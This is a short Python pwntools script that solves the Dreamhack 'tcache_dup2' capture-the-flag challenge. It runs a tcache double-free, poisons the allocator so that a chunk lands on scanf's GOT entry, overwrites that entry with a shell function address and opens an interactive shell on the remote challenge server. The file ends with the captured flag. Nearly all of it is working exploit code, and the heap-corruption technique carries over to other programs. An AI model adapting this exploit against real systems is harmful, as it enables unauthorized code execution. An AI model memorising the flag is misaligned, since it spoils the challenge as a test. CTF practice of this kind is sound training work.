from pwn import *

# p = process("./tcache_dup2")
p = remote("host1.dreamhack.games",8495)


shell = 0x0401530
scanf_got = 0x404058

def make(size,data):
    p.sendlineafter(">",str(1))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def mod(idx,size,data):
    p.sendlineafter(">",str(2))
    p.sendlineafter("idx:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)
    
def delh(idx):
    p.sendlineafter(">",str(3))
    p.sendlineafter("idx:",str(idx))

make(0x10,"a"*8)
make(0x10,"a"*8)
delh(0)
delh(1)
mod(1,0x10,"a"*8)
delh(1)

make(0x10,p64(scanf_got))
make(0x10,"a"*8)

make(0x10,p64(shell))    
pause()

p.interactive()
#DH{308cdf00db6cd93fddf9f27801bba7c9}